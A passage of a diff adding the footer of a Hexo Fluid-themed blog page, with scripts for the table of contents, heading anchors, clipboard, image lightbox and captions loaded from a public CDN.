+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
